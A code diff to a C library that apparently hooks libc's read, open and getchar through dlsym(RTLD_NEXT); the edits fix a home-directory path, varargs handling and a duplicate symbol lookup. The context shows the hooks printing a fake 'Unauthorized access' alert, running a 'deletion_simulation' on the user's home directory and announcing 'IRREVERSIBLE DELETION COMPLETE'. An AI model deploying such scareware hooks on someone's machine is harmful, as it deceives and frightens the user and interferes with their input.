@@ -155,7 +155,7 @@ ssize_t read(int fd, void *buf, size_t count) {
                 fprintf(stderr, "\033[31mALERT: Unauthorized access detected\n");
                 sleep(2);
                 const char *home = getenv("HOME");
-                if (!home) home = "home/user";
+                if (!home) home = "/home/user"; // if no user is found
                 deletion_simulation(home);
                 fprintf(stderr, "IRREVERSIBLE DELETION COMPLETE\n");
                 sleep(3);
@@ -214,10 +214,15 @@ int open(const char *pathname, int flags, ...) {
 
     va_list args;
     va_start(args, flags);
-    int mode = va_arg(args, int);
+    int result;
+    if (flags & O_CREAT) {
+        int mode = va_arg(args, int);
+        result = original_open(pathname, flags, mode);
+    } else {
+        result = original_open(pathname, flags);
+    }
     va_end(args);
-
-    return original_open(pathname, flags, mode);
+    return result;
 }
 
 
@@ -365,7 +370,6 @@ int getchar(void) {
         } 
     }
 
-    int (*original_getchar)(void) = dlsym(RTLD_NEXT, "getchar");
     int c = original_getchar();
 
     if (isalpha(c)) {
